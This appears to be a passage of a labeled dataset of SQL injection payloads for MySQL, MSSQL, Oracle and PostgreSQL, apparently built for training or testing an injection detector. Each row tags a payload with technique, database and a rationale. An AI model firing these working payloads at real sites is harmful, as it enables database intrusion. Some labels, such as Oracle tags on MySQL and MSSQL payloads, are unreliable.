+21084,"1"" ) ) or updatexml ( 1808,concat ( 0x2e,0x7171706a71, ( select ( elt ( 1808 = 1808,1 ) ) ) ,0x717a767a71 ) ,8666 ) and ( ( ""umst"" = ""umst",error_based,mysql,0.8,"updatexml() = MySQL error-based SQLi with XPath injection.",1
+21085,"1"" ) ) union all select null,null,null,null,null,null,null,null--",union_based,generic,0.8,"'union all select null' = union-based SQLi.",2
+21086,"-5691' union all select 6610,6610#",union_based,generic,0.8,"'union all select' = union-based SQLi.",2
+21087,"1'|| ( select 'ybfo' from dual where 3319 = 3319 union all select null,null,null,null,null,null,null,null#",union_based,oracle,0.85,"'union all select null' with dual = Oracle union-based SQLi.",2
+21088,"-3442' in boolean mode ) union all select 6255,6255,6255,6255,6255#",union_based,generic,0.8,"'union all select' = union-based SQLi.",2
+21089,"1' where 6721 = 6721 union all select null,null,null,null,null,null,null,null,null,null#",union_based,generic,0.8,"'union all select null' = union-based SQLi.",2
+21090,"1 ) and row ( 6237,7469 ) > ( select count ( * ) ,concat ( 0x7171706a71, ( select ( elt ( 6237 = 6237,1 ) ) ) ,0x717a767a71,floor ( rand ( 0 ) *2 ) ) x from ( select 5192 union select 3785 union select 3931 union select 7158 ) a group by x )",boolean_blind,mysql,0.7,"elt() with GROUP BY = MySQL boolean-blind SQLi.",0
+21091,"-2849' union all select 6491,6491,6491,6491,6491,6491,6491--",union_based,generic,0.8,"'union all select' = union-based SQLi.",2
+21092,"1%"" ) ) ) rlike sleep ( 5 ) and ( ( ( ""%"" = """,time_blind,mysql,0.75,"sleep() = MySQL time-based blind SQLi.",1
+21093,1' where 5455 = 5455 and sleep ( 5 ) --,time_blind,mysql,0.85,"sleep() = MySQL time-based blind SQLi.",1
+21094,"-2007%' ) ) union all select 7298,7298,7298#",union_based,generic,0.8,"'union all select' = union-based SQLi.",2
+21095,"1' ) ) as sxpk where 5524 = 5524 and row ( 6237,7469 ) > ( select count ( * ) ,concat ( 0x7171706a71, ( select ( elt ( 6237 = 6237,1 ) ) ) ,0x717a767a71,floor ( rand ( 0 ) *2 ) ) x from ( select 5192 union select 3785 union select 3931 union select 7158 ) a group by x ) --",boolean_blind,mysql,0.7,"elt() with GROUP BY = MySQL boolean-blind SQLi.",1
+21096,"select sleep ( 5 ) and ""jvys"" like ""jvys",time_blind,mysql,0.9,"sleep() = MySQL time-based blind SQLi.",1
+21097,"-6086"" union all select 8700,8700,8700,8700--",union_based,generic,0.8,"'union all select' = union-based SQLi.",2
+21098,"1 where 2292 = 2292 union all select null,null,null,null#",union_based,generic,0.8,"'union all select null' = union-based SQLi.",2
+21099,1 ) ) as skex where 7941 = 7941 and sleep ( 5 ) --,time_blind,mysql,0.85,"sleep() = MySQL time-based blind SQLi.",1
+21100,"1"" or ( select * from ( select ( sleep ( 5 ) ) ) sddo ) #",time_blind,mysql,0.75,"sleep() in nested SELECT = MySQL time-based blind SQLi.",1
+21101,1 ) as uhmm where 2304 = 2304 union all select null#,union_based,generic,0.8,"'union all select null' = union-based SQLi.",2
+21102,"-1150' ) as hdby where 4032 = 4032 union all select 4032,4032,4032,4032,4032,4032,4032,4032,4032,4032--",union_based,generic,0.8,"'union all select' = union-based SQLi.",2
+21103,"1 ) ) or elt ( 6272 = 6272,sleep ( 5 ) ) and ( ( 8024 = 8024",boolean_blind,mysql,0.7,"elt() (P3) > sleep(P5). MySQL boolean-blind SQLi.",0
+21104,"select pg_sleep ( 5 ) and ( ( ( ""wqeb"" = ""wqeb",time_blind,postgresql,0.9,"pg_sleep() = PostgreSQL time-based blind SQLi.",1
+21105,"1"" rlike ( select * from ( select ( sleep ( 5 ) ) ) sgvo )",boolean_blind,mysql,0.7,"rlike(select sleep()) = MySQL boolean-blind SQLi.",1
+21106,"1"" and ( select * from ( select ( sleep ( 5 ) ) ) gcrr ) #",time_blind,mysql,0.75,"sleep() in nested SELECT = MySQL time-based blind SQLi.",1
+21107,"1 ) as zhvx where 3171 = 3171 procedure analyse ( extractvalue ( 5840,concat ( 0x5c,0x7171706a71, ( select ( case when ( 5840 = 5840 ) then 1 else 0 end ) ) ,0x717a767a71 ) ) ,1 ) --",error_based,mysql,0.8,"extractvalue() = MySQL error-based SQLi.",1
+21108,1' ) waitfor delay '0:0:5',time_blind,mssql,0.9,"waitfor delay '0:0:5' = MSSQL time-based blind SQLi.",2
+21109,"1%"" ) ) union all select null,null,null,null#",union_based,generic,0.8,"'union all select null' = union-based SQLi.",2
+21110,"1"" where 9632 = 9632 and row ( 6237,7469 ) > ( select count ( * ) ,concat ( 0x7171706a71, ( select ( elt ( 6237 = 6237,1 ) ) ) ,0x717a767a71,floor ( rand ( 0 ) *2 ) ) x from ( select 5192 union select 3785 union select 3931 union select 7158 ) a group by x ) --",boolean_blind,mysql,0.7,"elt() with GROUP BY = MySQL boolean-blind SQLi.",1
+21111,"-2384%' ) ) union all select 2467,2467,2467,2467#",union_based,generic,0.8,"'union all select' = union-based SQLi.",2
+21112,"1"" ) ) union all select null,null,null,null,null#",union_based,generic,0.8,"'union all select null' = union-based SQLi.",2
+21113,1'+ ( select 'gmpn' where 8137 = 8137 or sleep ( 5 ) ) +',time_blind,mysql,0.75,"sleep() in nested SELECT = MySQL time-based blind SQLi.",1
+21114,"1"" ) ) ) rlike sleep ( 5 ) and ( ( ( ""qcqx"" like ""qcqx",time_blind,mysql,0.75,"sleep() = MySQL time-based blind SQLi.",1
+21115,"-5657' ) ) ) union all select 8071,8071,8071,8071,8071,8071,8071,8071#",union_based,generic,0.8,"'union all select' = union-based SQLi.",2
+21116,"1%"" ) ) and sleep ( 5 ) #",time_blind,mysql,0.85,"sleep() = MySQL time-based blind SQLi.",1
+21117,"1'|| ( select 'ysij' from dual where 6140 = 6140 procedure analyse ( extractvalue ( 9255,concat ( 0x5c, ( benchmark ( 5000000,md5 ( 0x52515a50 ) ) ) ) ) ,1 ) ) ||'",error_based,oracle,0.8,"extractvalue() = error-based SQLi. Dual + extractvalue indicate Oracle.",1
+21118,"1' in boolean mode ) union all select null,null,null,null#",union_based,generic,0.8,"'union all select null' = union-based SQLi.",2
+21119,"-1559 union all select 3985,3985,3985,3985#",union_based,generic,0.8,"'union all select' = union-based SQLi.",2
+21120,"-5934' union all select 6096,6096,6096,6096,6096#",union_based,generic,0.8,"'union all select' = union-based SQLi.",2
+21121,"1%"" ) ) ) union all select null,null,null,null,null,null,null,null,null--",union_based,generic,0.8,"'union all select null' = union-based SQLi.",2
+21122,"1"" ) ) as jgie where 8017 = 8017 and ( select * from ( select ( sleep ( 5 ) ) ) fzno ) --",time_blind,mysql,0.75,"sleep() in nested SELECT = MySQL time-based blind SQLi.",1
+21123,1' waitfor delay '0:0:5' and 'dtej' like 'dtej,time_blind,mssql,0.9,"waitfor delay '0:0:5' = MSSQL time-based blind SQLi.",2
+21124,"1' union all select null,null,null,null,null,null,null,null,null--",union_based,generic,0.8,"'union all select null' = union-based SQLi.",2
+21125,"select sleep ( 5 ) and ( ( ""rthl"" like ""rthl",time_blind,mysql,0.9,"sleep() = MySQL time-based blind SQLi.",1
+21126,"1' ) ) as owcw where 1107 = 1107 and 8312 = dbms_pipe.receive_message ( chr ( 69 ) ||chr ( 79 ) ||chr ( 101 ) ||chr ( 68 ) ,5 ) --",time_blind,oracle,0.9,"dbms_pipe.receive_message() = Oracle time-based blind SQLi.",2
+21127,"1 ) where 1559 = 1559 or updatexml ( 1808,concat ( 0x2e,0x7171706a71, ( select ( elt ( 1808 = 1808,1 ) ) ) ,0x717a767a71 ) ,8666 ) --",error_based,mysql,0.8,"updatexml() = MySQL error-based SQLi.",1
+21128,"-6253' union all select 5756,5756,5756,5756,5756,5756,5756,5756,5756,5756#",union_based,generic,0.8,"'union all select' = union-based SQLi.",2
+21129,"1"" and 3754 = ( select upper ( xmltype ( chr ( 60 ) ||chr ( 58 ) ||chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 3754 = 3754 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ||chr ( 62 ) ) ) from dual ) and ""xyjg"" = ""xyjg",error_based,oracle,0.85,"xmltype() = Oracle error-based SQLi with XML cast error.",1
+21130,1'|| ( select 'xwbo' from dual where 1263 = 1263 waitfor delay '0:0:5' ) ||',time_blind,oracle,0.85,"waitfor delay '0:0:5' = time-based blind (MSSQL function used in Oracle context).",1
+21131,"1'+ ( select ugvj where 2593 = 2593 union all select null,null,null,null,null#",union_based,generic,0.8,"'union all select null' = union-based SQLi.",2
+21132,"1' ) as yuqv where 6007 = 6007 or extractvalue ( 1297,concat ( 0x5c,0x7171706a71, ( select ( elt ( 1297 = 1297,1 ) ) ) ,0x717a767a71 ) ) --",error_based,mysql,0.8,"extractvalue() = MySQL error-based SQLi.",1
+21133,-6109 union all select 6784--,union_based,generic,0.8,"'union all select' = union-based SQLi.",2
+21134,"1' in boolean mode ) procedure analyse ( extractvalue ( 5840,concat ( 0x5c,0x7171706a71, ( select ( case when ( 5840 = 5840 ) then 1 else 0 end ) ) ,0x717a767a71 ) ) ,1 ) #",error_based,mysql,0.8,"extractvalue() = MySQL error-based SQLi.",1
+21135,"1,extractvalue ( 9788,concat ( 0x5c,0x7171706a71, ( select ( elt ( 9788 = 9788,1 ) ) ) ,0x717a767a71 ) )",error_based,mysql,0.8,"extractvalue() = MySQL error-based SQLi.",1
+21136,1' ) as xrap where 5523 = 5523 rlike ( select * from ( select ( sleep ( 5 ) ) ) vwyq ) #,boolean_blind,mysql,0.7,"rlike(select sleep()) = MySQL boolean-blind SQLi.",1
+21137,"1"" ) ) and extractvalue ( 7982,concat ( 0x5c,0x7171706a71, ( select ( elt ( 7982 = 7982,1 ) ) ) ,0x717a767a71 ) ) and ( ( ""gcyp"" like ""gcyp",error_based,mysql,0.8,"extractvalue() = MySQL error-based SQLi.",1
+21138,1' ) ) as hpta where 5376 = 5376 waitfor delay '0:0:5'--,time_blind,mssql,0.9,"waitfor delay '0:0:5' = MSSQL time-based blind SQLi.",2
+21139,1 ) where 2468 = 2468 and ( select * from ( select ( sleep ( 5 ) ) ) gcrr ) #,time_blind,mysql,0.75,"sleep() in nested SELECT = MySQL time-based blind SQLi.",1
+21140,"1%"" ) waitfor delay '0:0:5' and ( ""%"" = """,time_blind,mssql,0.9,"waitfor delay '0:0:5' = MSSQL time-based blind SQLi.",2
+21141,"1' ) ) union all select null,null,null,null,null#",union_based,generic,0.8,"'union all select null' = union-based SQLi.",2
+21142,"1"" ) as boeh where 2571 = 2571 union all select null#",union_based,generic,0.8,"'union all select null' = union-based SQLi.",2
+21143,"1' ) union all select null,null,null,null,null,null,null,null#",union_based,generic,0.8,"'union all select null' = union-based SQLi.",2
